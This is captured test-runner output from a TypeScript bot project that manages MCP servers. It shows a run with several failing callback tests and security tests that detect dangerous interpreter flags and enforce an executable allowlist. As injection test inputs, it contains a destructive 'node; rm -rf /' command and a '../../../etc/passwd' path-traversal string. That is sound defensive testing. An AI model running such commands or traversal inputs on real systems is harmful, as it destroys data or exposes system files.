[90mstdout[2m | tests/message-handler.test.ts[2m > [22m[2mMessageHandler[2m > [22m[2mshould log initial message with timestamp and msgId[22m[39m
2026-02-12T17:11:36.540Z [[32minfo[39m]: Starting Copilot API call {"chatId":"789","userId":"user123","promptLength":11,"prompt":"test prompt","hasAbortSignal":false}

[90mstdout[2m | tests/message-handler.test.ts[2m > [22m[2mMessageHandler[2m > [22m[2mshould log initial message with timestamp and msgId[22m[39m
2026-02-12T17:11:36.541Z [[32minfo[39m]: Operation completed with enhanced stats {"chatId":"789","userId":"user123","elapsedMs":1,"autoExtensionCount":0,"manualExtensions":0,"totalExtensions":0,"totalExtensionMs":0}

[90mstdout[2m | tests/message-handler.test.ts[2m > [22m[2mMessageHandler[2m > [22m[2mshould update message with progress format during message_delta[22m[39m
2026-02-12T17:11:36.635Z [[32minfo[39m]: Starting Copilot API call {"chatId":"456","userId":"user123","promptLength":11,"prompt":"test prompt","hasAbortSignal":false}

[90mstdout[2m | tests/message-handler.test.ts[2m > [22m[2mMessageHandler[2m > [22m[2mshould update message with progress format during message_delta[22m[39m
2026-02-12T17:11:36.656Z [[32minfo[39m]: Operation completed with enhanced stats {"chatId":"456","userId":"user123","elapsedMs":21,"autoExtensionCount":0,"manualExtensions":0,"totalExtensions":0,"totalExtensionMs":0}

 [31mÃ”Ã˜Â»[39m tests/message-handler.test.ts [2m ([22m[2m14 tests[22m [2m|[22m [31m1 failed[39m[2m)[22m[33m 5964[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m Heartbeat functionality[2m > [22mshould send heartbeat warning after HEARTBEAT_WARNING_INTERVAL without events[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called with arguments: [ '456', 123, StringMatching{Ã”Ã‡Âª}, Ã”Ã‡Âª(1) ][90m

Received: 

[1m  1st spy call:

[22m[2m  Array [[22m
[2m    "456",[22m
[2m    123,[22m
[32m-   StringMatching /Ã”Ã…â”‚ La tarea sigue en progreso \(\d+m \d+s\)\. Tiempo restante: \d+m\. \/stop para cancelar/,[90m
[31m+   "Ã”Ã…â”‚ La tarea sigue en progreso (10s). Tiempo restante: 9m. /stop para cancelar",[90m
[2m    Object {[22m
[2m      "parse_mode": "HTML",[22m
[2m    },[22m
[2m  ][22m
[31m[90m

Number of calls: [1m1[22m
[31m[39m
[90mstdout[2m | tests/integration/verification.test.ts[2m > [22m[2mPhase 4: Comprehensive Verification Tests[2m > [22m[2mIntegration: Retry with Logging[2m > [22m[2mshould log retry attempts with sanitized data[22m[39m
2026-02-12T17:11:36.667Z [[33mwarn[39m]: Network error detected - will retry {"attempt":1,"maxAttempts":5,"errorCode":"ECONNRESET","errorMessage":"Network error","retryInMs":10}

[90mstdout[2m | tests/integration/verification.test.ts[2m > [22m[2mPhase 4: Comprehensive Verification Tests[2m > [22m[2mIntegration: Retry with Logging[2m > [22m[2mshould log retry attempts with sanitized data[22m[39m
2026-02-12T17:11:36.686Z [[33mwarn[39m]: Network error detected - will retry {"attempt":2,"maxAttempts":5,"errorCode":"ECONNRESET","errorMessage":"Network error","retryInMs":20}

 [32mÃ”Â£Ã´[39m tests/timeout-critical-fixes.test.ts [2m ([22m[2m15 tests[22m[2m)[22m[33m 489[2mms[22m[39m
[90mstdout[2m | tests/dangerous-args-detection.test.ts[2m > [22m[2mServerManagementService - Dangerous Arguments Detection (Task 2.3)[2m > [22m[2maddServer with dangerous arguments[2m > [22m[2mshould require confirmation for dangerous arguments[22m[39m
2026-02-12T17:11:37.141Z [[33mwarn[39m]: Dangerous arguments detected in MCP server command {"userId":1,"serverName":"dangerous-server","command":"node","args":["-e","console.log(\"code\")"],"dangerousFlags":["-e"],"fullCommand":"node -e \"console.log(\\\"code\\\")\""}

[90mstdout[2m | tests/dangerous-args-detection.test.ts[2m > [22m[2mServerManagementService - Dangerous Arguments Detection (Task 2.3)[2m > [22m[2maddServer with dangerous arguments[2m > [22m[2mshould allow adding server with confirmation[22m[39m
2026-02-12T17:11:37.148Z [[33mwarn[39m]: Dangerous arguments confirmed by user {"userId":1,"serverName":"dangerous-server","command":"node","args":["-e","console.log(\"code\")"],"dangerousFlags":["-e"],"fullCommand":"node -e \"console.log(\\\"code\\\")\"","decision":"confirmed"}
2026-02-12T17:11:37.149Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"dangerous-server","serverType":"stdio"}

[90mstdout[2m | tests/dangerous-args-detection.test.ts[2m > [22m[2mServerManagementService - Dangerous Arguments Detection (Task 2.3)[2m > [22m[2maddServer with dangerous arguments[2m > [22m[2mshould log security event when dangerous args are confirmed[22m[39m
2026-02-12T17:11:37.152Z [[33mwarn[39m]: Dangerous arguments confirmed by user {"userId":1,"serverName":"dangerous-server","command":"node","args":["-e","console.log(\"code\")"],"dangerousFlags":["-e"],"fullCommand":"node -e \"console.log(\\\"code\\\")\"","decision":"confirmed"}
2026-02-12T17:11:37.152Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"dangerous-server","serverType":"stdio"}

[90mstdout[2m | tests/dangerous-args-detection.test.ts[2m > [22m[2mServerManagementService - Dangerous Arguments Detection (Task 2.3)[2m > [22m[2maddServer with dangerous arguments[2m > [22m[2mshould NOT require confirmation for safe arguments[22m[39m
2026-02-12T17:11:37.156Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"safe-server","serverType":"stdio"}

[90mstdout[2m | tests/dangerous-args-detection.test.ts[2m > [22m[2mServerManagementService - Dangerous Arguments Detection (Task 2.3)[2m > [22m[2maddServer with dangerous arguments[2m > [22m[2mshould include dangerous flags details in error[22m[39m
2026-02-12T17:11:37.158Z [[33mwarn[39m]: Dangerous arguments detected in MCP server command {"userId":1,"serverName":"dangerous-server","command":"python","args":["-c","import os"],"dangerousFlags":["-c"],"fullCommand":"python -c \"import os\""}

[90mstdout[2m | tests/dangerous-args-detection.test.ts[2m > [22m[2mServerManagementService - Dangerous Arguments Detection (Task 2.3)[2m > [22m[2maddServer with dangerous arguments[2m > [22m[2mshould handle multiple dangerous flags in error[22m[39m
2026-02-12T17:11:37.161Z [[33mwarn[39m]: Dangerous arguments detected in MCP server command {"userId":1,"serverName":"dangerous-server","command":"node","args":["-e","code","-p","more"],"dangerousFlags":["-e","-p"],"fullCommand":"node -e code -p more"}

[90mstdout[2m | tests/dangerous-args-detection.test.ts[2m > [22m[2mServerManagementService - Dangerous Arguments Detection (Task 2.3)[2m > [22m[2mSecurity logging for dangerous arguments[2m > [22m[2mshould log when dangerous arguments are detected[22m[39m
2026-02-12T17:11:37.166Z [[33mwarn[39m]: Dangerous arguments detected in MCP server command {"userId":1,"serverName":"dangerous-server","command":"node","args":["-e","code"],"dangerousFlags":["-e"],"fullCommand":"node -e code"}

[90mstdout[2m | tests/dangerous-args-detection.test.ts[2m > [22m[2mServerManagementService - Dangerous Arguments Detection (Task 2.3)[2m > [22m[2mSecurity logging for dangerous arguments[2m > [22m[2mshould log when user confirms dangerous arguments[22m[39m
2026-02-12T17:11:37.168Z [[33mwarn[39m]: Dangerous arguments confirmed by user {"userId":1,"serverName":"dangerous-server","command":"node","args":["-e","code"],"dangerousFlags":["-e"],"fullCommand":"node -e code","decision":"confirmed"}
2026-02-12T17:11:37.169Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"dangerous-server","serverType":"stdio"}

[90mstdout[2m | tests/dangerous-args-detection.test.ts[2m > [22m[2mServerManagementService - Dangerous Arguments Detection (Task 2.3)[2m > [22m[2mSecurity logging for dangerous arguments[2m > [22m[2mshould log full command in security events[22m[39m
2026-02-12T17:11:37.173Z [[33mwarn[39m]: Dangerous arguments confirmed by user {"userId":1,"serverName":"dangerous-server","command":"python","args":["-c","import os; os.system(\"ls\")"],"dangerousFlags":["-c"],"fullCommand":"python -c \"import os; os.system(\\\"ls\\\")\"","decision":"confirmed"}
2026-02-12T17:11:37.173Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"dangerous-server","serverType":"stdio"}

 [32mÃ”Â£Ã´[39m tests/dangerous-args-detection.test.ts [2m ([22m[2m50 tests[22m[2m)[22m[90m 189[2mms[22m[39m
 [31mÃ”Ã˜Â»[39m tests/bot-callbacks.test.ts [2m ([22m[2m28 tests[22m [2m|[22m [31m24 failed[39m[2m)[22m[90m 137[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mModel Change Callback[2m > [22mshould change model successfully with valid model[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called with arguments: [ '123456' ][90m

Received: 

[31m[90m

Number of calls: [1m0[22m
[31m[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mModel Change Callback[2m > [22mshould reject invalid model[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called with arguments: [ 'Modelo invâ”œÃ­lido' ][90m

Received: 

[1m  1st spy call:

[22m[32m- Array [[90m
[32m-   "Modelo invâ”œÃ­lido",[90m
[32m- ][90m
[31m+ Array [][90m
[31m[90m

Number of calls: [1m1[22m
[31m[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mModel Change Callback[2m > [22mshould reject when session is busy[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called with arguments: [ 'Operaciâ”œâ”‚n en curso' ][90m

Received: 

[1m  1st spy call:

[22m[32m- Array [[90m
[32m-   "Operaciâ”œâ”‚n en curso",[90m
[32m- ][90m
[31m+ Array [][90m
[31m[90m

Number of calls: [1m1[22m
[31m[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mModel Change Callback[2m > [22mshould log errors and answer callback on failure[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called with arguments: [ Ã”Ã‡Âª(2) ][90m

Received: 

[31m[90m

Number of calls: [1m0[22m
[31m[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mModel Change Callback[2m > [22mshould always clear busy state in finally block[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called with arguments: [ '123456', false ][90m

Received: 

[31m[90m

Number of calls: [1m0[22m
[31m[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mProject Switch Callback[2m > [22mshould switch project successfully[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called with arguments: [ '123456', 'test-project' ][90m

Received: 

[31m[90m

Number of calls: [1m0[22m
[31m[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mProject Switch Callback[2m > [22mshould reject non-existent project[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called with arguments: [ 'Proyecto no encontrado' ][90m

Received: 

[1m  1st spy call:

[22m[32m- Array [[90m
[32m-   "Proyecto no encontrado",[90m
[32m- ][90m
[31m+ Array [][90m
[31m[90m

Number of calls: [1m1[22m
[31m[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mProject Switch Callback[2m > [22mshould reject path outside allowlist[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called with arguments: [ 'Ruta no permitida' ][90m

Received: 

[1m  1st spy call:

[22m[32m- Array [[90m
[32m-   "Ruta no permitida",[90m
[32m- ][90m
[31m+ Array [][90m
[31m[90m

Number of calls: [1m1[22m
[31m[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mProject Switch Callback[2m > [22mshould reject non-accessible path[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called with arguments: [ 'Ruta invâ”œÃ­lida' ][90m

Received: 

[1m  1st spy call:

[22m[32m- Array [[90m
[32m-   "Ruta invâ”œÃ­lida",[90m
[32m- ][90m
[31m+ Array [][90m
[31m[90m

Number of calls: [1m1[22m
[31m[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mProject Switch Callback[2m > [22mshould reject non-directory path[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called with arguments: [ 'Ruta invâ”œÃ­lida' ][90m

Received: 

[1m  1st spy call:

[22m[32m- Array [[90m
[32m-   "Ruta invâ”œÃ­lida",[90m
[32m- ][90m
[31m+ Array [][90m
[31m[90m

Number of calls: [1m1[22m
[31m[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mProject Switch Callback[2m > [22mshould reject when session is busy[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called with arguments: [ 'Operaciâ”œâ”‚n en curso' ][90m

Received: 

[1m  1st spy call:

[22m[32m- Array [[90m
[32m-   "Operaciâ”œâ”‚n en curso",[90m
[32m- ][90m
[31m+ Array [][90m
[31m[90m

Number of calls: [1m1[22m
[31m[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mProject Switch Callback[2m > [22mshould log errors and answer callback on switch failure[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called with arguments: [ Ã”Ã‡Âª(2) ][90m

Received: 

[31m[90m

Number of calls: [1m0[22m
[31m[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mProject Switch Callback[2m > [22mshould always clear busy state in finally block[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called with arguments: [ '123456', false ][90m

Received: 

[31m[90m

Number of calls: [1m0[22m
[31m[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mProject Switch Callback[2m > [22mshould handle stat error[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called with arguments: [ 'Ruta invâ”œÃ­lida' ][90m

Received: 

[1m  1st spy call:

[22m[32m- Array [[90m
[32m-   "Ruta invâ”œÃ­lida",[90m
[32m- ][90m
[31m+ Array [][90m
[31m[90m

Number of calls: [1m1[22m
[31m[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mMCP Toggle Callback[2m > [22mshould enable MCP server successfully[39m
[31m     Ã”Ã¥Ã† No handler found for callback: mcp_toggle:test-server:enable[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mMCP Toggle Callback[2m > [22mshould disable MCP server successfully[39m
[31m     Ã”Ã¥Ã† No handler found for callback: mcp_toggle:test-server:disable[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mMCP Toggle Callback[2m > [22mshould handle non-existent MCP server[39m
[31m     Ã”Ã¥Ã† No handler found for callback: mcp_toggle:nonexistent:enable[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mMCP Toggle Callback[2m > [22mshould reject when session is busy[39m
[31m     Ã”Ã¥Ã† No handler found for callback: mcp_toggle:some-server:enable[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mMCP Toggle Callback[2m > [22mshould log errors and answer callback on toggle failure[39m
[31m     Ã”Ã¥Ã† No handler found for callback: mcp_toggle:error-server:enable[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mMCP Toggle Callback[2m > [22mshould always clear busy state in finally block[39m
[31m     Ã”Ã¥Ã† No handler found for callback: mcp_toggle:test-server:disable[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mEdge Cases and Error Handling[2m > [22mshould handle missing from.id gracefully[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called with arguments: [ '', undefined ][90m

Received: 

[31m[90m

Number of calls: [1m0[22m
[31m[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mEdge Cases and Error Handling[2m > [22mshould handle missing from.username gracefully[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called with arguments: [ '999', undefined ][90m

Received: 

[31m[90m

Number of calls: [1m0[22m
[31m[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mEdge Cases and Error Handling[2m > [22mshould handle empty callback match groups[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called with arguments: [ 'Modelo invâ”œÃ­lido' ][90m

Received: 

[1m  1st spy call:

[22m[32m- Array [[90m
[32m-   "Modelo invâ”œÃ­lido",[90m
[32m- ][90m
[31m+ Array [][90m
[31m[90m

Number of calls: [1m1[22m
[31m[39m
[31m   [31mâ”œÃ¹[31m Bot Callbacks[2m > [22mAll Callbacks Registered[2m > [22mshould register all expected callback patterns[39m
[31m     Ã”Ã¥Ã† expected [ Ã”Ã‡Âª(4) ] to include '^mcp_toggle:(.+?):(enable|disable)$'[39m
[90mstdout[2m | tests/integration/verification.test.ts[2m > [22m[2mPhase 4: Comprehensive Verification Tests[2m > [22m[2mError Handling and Edge Cases[2m > [22m[2mshould handle retry with all failures[22m[39m
2026-02-12T17:11:37.612Z [[33mwarn[39m]: Network error detected - will retry {"attempt":1,"maxAttempts":3,"errorCode":"ECONNRESET","errorMessage":"Always fails","retryInMs":10}

[90mstdout[2m | tests/integration/verification.test.ts[2m > [22m[2mPhase 4: Comprehensive Verification Tests[2m > [22m[2mError Handling and Edge Cases[2m > [22m[2mshould handle retry with all failures[22m[39m
2026-02-12T17:11:37.637Z [[33mwarn[39m]: Network error detected - will retry {"attempt":2,"maxAttempts":3,"errorCode":"ECONNRESET","errorMessage":"Always fails","retryInMs":20}

[90mstdout[2m | tests/integration/verification.test.ts[2m > [22m[2mPhase 4: Comprehensive Verification Tests[2m > [22m[2mError Handling and Edge Cases[2m > [22m[2mshould handle retry with all failures[22m[39m
2026-02-12T17:11:37.668Z [[31merror[39m]: Max retries exhausted - giving up {"maxAttempts":3,"lastError":"Always fails","lastErrorCode":"ECONNRESET"}

 [31mÃ”Ã˜Â»[39m tests/integration/verification.test.ts [2m ([22m[2m33 tests[22m [2m|[22m [31m1 failed[39m[2m)[22m[33m 7024[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m Phase 4: Comprehensive Verification Tests[2m > [22mError Handling and Edge Cases[2m > [22mshould handle null and undefined in sanitization[39m
[31m     Ã”Ã¥Ã† expected null to be undefined[39m
[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould accept allowed executables - node[22m[39m
2026-02-12T17:11:37.863Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"node-server","serverType":"stdio"}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould accept allowed executables - python[22m[39m
2026-02-12T17:11:37.871Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"python-server","serverType":"stdio"}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould accept allowed executables - python3[22m[39m
2026-02-12T17:11:37.874Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"python3-server","serverType":"stdio"}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould accept allowed executables - npx[22m[39m
2026-02-12T17:11:37.877Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"npx-server","serverType":"stdio"}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould accept allowed executables - deno[22m[39m
2026-02-12T17:11:37.881Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"deno-server","serverType":"stdio"}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould accept allowed executables - bun[22m[39m
2026-02-12T17:11:37.885Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"bun-server","serverType":"stdio"}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould accept allowed executables with .exe extension on Windows[22m[39m
2026-02-12T17:11:37.888Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"node-exe-server","serverType":"stdio"}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould accept allowed executables with full path when path matches system PATH[22m[39m
2026-02-12T17:11:37.894Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"node-path-server","serverType":"stdio"}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould accept allowed executables with Windows path when path matches system PATH[22m[39m
2026-02-12T17:11:37.899Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"node-win-path-server","serverType":"stdio"}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould reject disallowed executables - bash[22m[39m
2026-02-12T17:11:37.901Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"bash","basename":"bash","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould reject disallowed executables - sh[22m[39m
2026-02-12T17:11:37.907Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"sh","basename":"sh","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould reject disallowed executables - arbitrary binary[22m[39m
2026-02-12T17:11:37.910Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"malicious-binary","basename":"malicious-binary","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould show allowed executables in error message[22m[39m
2026-02-12T17:11:37.915Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"bad-cmd","basename":"bad-cmd","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould be case-insensitive on Windows for validation[22m[39m
2026-02-12T17:11:37.925Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"node-uppercase","serverType":"stdio"}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould respect custom allowlist from env var[22m[39m
2026-02-12T17:11:37.932Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"custom-server","serverType":"stdio"}
2026-02-12T17:11:37.933Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"node","basename":"node","allowedExecutables":["custom-runtime"]}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould log rejected executable attempts[22m[39m
2026-02-12T17:11:37.936Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"unauthorized-cmd","basename":"unauthorized-cmd","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould not validate HTTP servers (no command)[22m[39m
2026-02-12T17:11:37.940Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"http-server","serverType":"http"}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould handle npx.cmd on Windows[22m[39m
2026-02-12T17:11:37.943Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"npx-cmd-server","serverType":"stdio"}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould extract basename from full path for validation[22m[39m
2026-02-12T17:11:37.948Z [[33mwarn[39m]: where/which returned success but no paths found {"userId":1,"absolutePath":"/usr/local/bin/malicious","basename":"malicious"}
2026-02-12T17:11:37.948Z [[33mwarn[39m]: MCP executable rejected: absolute path not in system PATH {"userId":1,"command":"/usr/local/bin/malicious"}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mExecutable validation in addServer[2m > [22m[2mshould prevent command injection via executable name[22m[39m
2026-02-12T17:11:37.952Z [[33mwarn[39m]: MCP executable rejected due to dangerous characters {"userId":1,"command":"node; rm -rf /"}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mEdge cases and security[2m > [22m[2mshould reject commands with multiple dots (exact matching)[22m[39m
2026-02-12T17:11:37.958Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"node.v20.exe","basename":"node.v20.exe","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mEdge cases and security[2m > [22m[2mshould handle symlinks that resolve to allowed executables[22m[39m
2026-02-12T17:11:37.962Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"symlink-server","serverType":"stdio"}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mEdge cases and security[2m > [22m[2mshould prevent path traversal in command[22m[39m
2026-02-12T17:11:37.965Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"../../../etc/passwd","basename":"passwd","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/mcp-executable-allowlist.test.ts[2m > [22m[2mMCP Executable Allowlist Security[2m > [22m[2mEdge cases and security[2m > [22m[2mshould handle Windows UNC paths[22m[39m
2026-02-12T17:11:37.968Z [[33mwarn[39m]: where/which returned success but no paths found {"userId":1,"absolutePath":"\\\\server\\share\\node.exe","basename":"node.exe"}
2026-02-12T17:11:37.969Z [[33mwarn[39m]: MCP executable rejected: absolute path not in system PATH {"userId":1,"command":"\\\\server\\share\\node.exe"}

 [32mÃ”Â£Ã´[39m tests/mcp-executable-allowlist.test.ts [2m ([22m[2m29 tests[22m[2m)[22m[90m 145[2mms[22m[39m
[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mDangerous arguments detection during wizard flow[2m > [22m[2mshould detect dangerous args during STDIO server creation[22m[39m
2026-02-12T17:11:38.096Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.105Z [[32minfo[39m]: Dangerous arguments detected in wizard {"userId":1,"serverName":"dangerous-server","flags":["-e"],"fullCommand":"node -e \"malicious code\""}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mDangerous arguments detection during wizard flow[2m > [22m[2mshould show security warning message with detected flags[22m[39m
2026-02-12T17:11:38.111Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.112Z [[32minfo[39m]: Dangerous arguments detected in wizard {"userId":1,"serverName":"dangerous-server","flags":["-e"],"fullCommand":"node -e \"console.log(1)\""}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mDangerous arguments detection during wizard flow[2m > [22m[2mshould include full command in warning message[22m[39m
2026-02-12T17:11:38.116Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.116Z [[32minfo[39m]: Dangerous arguments detected in wizard {"userId":1,"serverName":"test-server","flags":["-c"],"fullCommand":"python -c \"import os\""}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mDangerous arguments detection during wizard flow[2m > [22m[2mshould preserve quotes in command display for args with spaces[22m[39m
2026-02-12T17:11:38.119Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.120Z [[32minfo[39m]: Dangerous arguments detected in wizard {"userId":1,"serverName":"test-server","flags":["-e"],"fullCommand":"node -e \"console.log(hello world)\""}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mDangerous arguments detection during wizard flow[2m > [22m[2mshould list multiple dangerous flags in warning[22m[39m
2026-02-12T17:11:38.123Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.125Z [[32minfo[39m]: Dangerous arguments detected in wizard {"userId":1,"serverName":"multi-danger","flags":["-e","-p"],"fullCommand":"node -e code -p more"}

